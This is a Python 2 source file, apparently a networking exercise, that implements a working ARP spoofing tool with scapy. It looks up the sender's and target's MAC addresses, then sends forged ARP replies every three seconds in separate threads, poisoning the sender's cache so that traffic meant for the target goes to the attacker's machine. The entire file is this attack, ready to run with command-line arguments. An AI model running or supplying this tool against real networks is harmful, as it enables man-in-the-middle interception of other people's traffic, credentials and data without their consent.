#!/usr/bin/python
#-*- coding: utf-8 -*-

import subprocess
import sys
import re
from threading import *
from time import sleep
from scapy.all import *
from pwn import hexdump

execmd = lambda cmd : subprocess.check_output(cmd, shell=True)
ip_regex = ('[\d]{1,3}.'*4)[:-1]
mac_regex = ('[0-9a-f]{2}:'*6)[:-1]

'''
Get my mac,ip address 
'''
def getMyAddr(dev):
    tmp = execmd('ifconfig | grep {} -A 10'.format(dev))
    my_ip = re.findall(ip_regex, tmp)[0]
    my_mac = re.findall(mac_regex, tmp)[0]
    return my_mac, my_ip

'''
Get mac address using ip address.
'''
def get_macaddr(ip_addr):
    eth_srcmac = my_mac
    eth_dstmac = 'ff:ff:ff:ff:ff:ff'
    arp_srcip = ip_addr
    arp_srcmac = '00:00:00:00:00:00'
    arp_dstip = my_ip
    arp_dstmac = my_mac       
    reqPacket = Ether(src=eth_srcmac, dst=eth_dstmac, type=0x0806)/ARP(pdst=arp_srcip, psrc=arp_dstip, hwsrc=arp_dstmac, ptype=0x0800, hwtype=1, hwlen=6, plen=4, op=ARP.who_has)
    return srp(reqPacket)

'''
Send arp reply packet to sender.
'''
def ARP_reply(sender_mac, sender_ip, target_ip):
    while True:
        try:
            eth_srcmac = my_mac
            eth_dstmac = sender_mac
            arp_srcip = sender_ip
            arp_srcmac = sender_mac
            arp_dstip = target_ip
            arp_dstmac = my_mac

            print eth_srcmac, eth_dstmac, arp_srcip, arp_srcmac, arp_dstip, arp_dstmac

            packet = Ether(src=eth_srcmac, dst=eth_dstmac, type=0x0806)/ARP(pdst=arp_srcip, hwdst=arp_srcmac, psrc=arp_dstip, hwsrc=arp_dstmac, ptype=0x0800, hwtype=1, hwlen=6, plen=4, op=ARP.is_at)

            print '[+] ARP reply packet send to {}'.format(sender_ip)
            sendp(packet, verbose=False)
            sleep(3)
        except:
            break


if __name__ == '__main__':
    print '[+] Check args.'
    if (len(sys.argv) < 4) or (len(sys.argv) % 2):
        print '[!] Usage : python arp_spoof.py <interface> <sender ip1> <target ip1> [<sender ip2> <target ip2> ...]'
        exit()

    print '[+] Init.' 
    my_ip = ''        
    my_mac = ''       
    sender_ip = []        
    sender_mac = []       
    target_mac = []       
    target_ip = []       

    print '[+] Get my Address.'
    ifname = sys.argv[1]
    for idx in range(1, (len(sys.argv)-2)/2 + 1):
        sender_ip.append(sys.argv[2*idx])
        target_ip.append(sys.argv[2*idx+1])
    my_mac, my_ip = getMyAddr(ifname)

    print '[+] Get sender, target mac address.'
    for idx in range((len(sys.argv)-2)/2):
        sender_mac.append(get_macaddr(sender_ip[idx])[0][0][1].src)
        target_mac.append(get_macaddr(target_ip[idx])[0][0][1].src)

    print '[*]', 'INFORMATION'.center(30, '-')
    print 'MY IP'.ljust(14, ' '),': {}'.format(my_ip)
    print 'MY MAC'.ljust(14, ' '), ': {}'.format(my_mac)
    for idx in range((len(sys.argv)-2)/2):
        print '-'*34
        print 'SENDER{} IP'.format(idx+1).ljust(14, ' '), ': {}'.format(sender_ip[idx])
        print 'SENDER{} MAC'.format(idx+1).ljust(14, ' '), ': {}'.format(sender_mac[idx])
        print 'TARGET{} IP'.format(idx+1).ljust(14, ' '), ': {}'.format(target_ip[idx])
        print 'TRAGET{} MAC'.format(idx+1).ljust(14, ' '), ': {}'.format(target_mac[idx])
    print '-'*34
    
    for idx in range((len(sys.argv)-2)/2):
        Thread(target=ARP_reply, args=(sender_mac[idx], sender_ip[idx], target_ip[idx],)).start()

    while(1):
        sleep(5)
